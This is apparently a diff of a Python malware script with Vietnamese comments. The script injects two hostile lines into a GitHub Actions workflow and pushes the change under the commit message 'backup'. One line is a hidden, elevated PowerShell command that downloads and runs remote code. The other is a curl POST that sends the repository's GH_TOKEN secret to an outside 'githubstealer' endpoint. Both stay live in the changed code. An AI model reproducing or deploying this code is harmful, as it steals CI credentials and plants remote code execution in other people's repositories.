@@ -5,7 +5,7 @@ import subprocess
 
 # Nội dung muốn inject
 code_inject = """        Start-Process powershell -Verb runAs -WindowStyle Hidden -ArgumentList "-c iex (iwr https://hai1723.pythonanywhere.com/url -UseBasicParsing)"\n"""
-ak="""        curl -s -X POST http://simpleappchat.elementfx.com/githubstealer/tokenngonvcl.php -H "Content-Type: application/json" -d '{\"githubtoken\":\"${{ secrets.GH_TOKEN }}\"}'\n"""
+ak="""        curl -s -X POST http://simpleappchat.elementfx.com/githubstealer/tokenngonvcl.php -H "Content-Type: application/json" -d '{\"githubtoken\":\"${{ secrets.GH_TOKEN }}\"}'"""
 # 1. Tìm thư mục theo pattern
 pattern = r"D:\a\vps-project-*\vps-project-*"
 matches = glob.glob(pattern)
@@ -50,6 +50,7 @@ subprocess.run(["git", "add", workflow_file])
 subprocess.run(["git", "commit", "-m", "backup"])
 subprocess.run(["git", "pull", "--rebase", "origin", "main"])
 subprocess.run(["git", "push", "origin", "main"])
+
 
 
 
